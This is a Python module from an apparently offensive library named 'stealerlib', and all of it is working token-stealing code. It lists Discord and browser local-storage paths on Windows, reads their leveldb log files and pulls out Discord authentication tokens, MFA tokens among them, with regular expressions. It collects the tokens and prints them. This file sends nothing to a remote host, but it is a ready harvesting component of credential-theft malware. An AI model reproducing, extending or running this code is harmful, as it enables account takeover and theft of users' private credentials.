#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/discord/__init__.py
"""

import os
import re

from dataclasses import dataclass

from stealerlib.exceptions import catch


class Discord:
    def __init__(self):
        self.tokens = []
        self.accounts = []
        self.appdata = appdata = os.getenv("localappdata")
        self.roaming = roaming = os.getenv("appdata")
        self.paths = {
            'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

    def get_available_paths(self) -> list:
        available_paths = []
        for path in self.paths.values():
            if not os.path.exists(path):
                continue
            available_paths.append(path)

        return available_paths

    @catch
    def get_tokens(self) -> list:
        available_paths = self.get_available_paths()

        for path in available_paths:
            for file in os.listdir(path):
                if not file.endswith('.log') and not file.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file}', errors='ignore').readlines() if x.strip()]:
                    for regex in ('[\w-]{24}\.[\w-]{6}\.[\w-]{27}', 'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            if token in self.tokens:
                                continue

                            self.tokens.append(token)

        return self.tokens


if __name__ == '__main__':
    discord = Discord()
    discord.get_tokens()
    print(discord.tokens)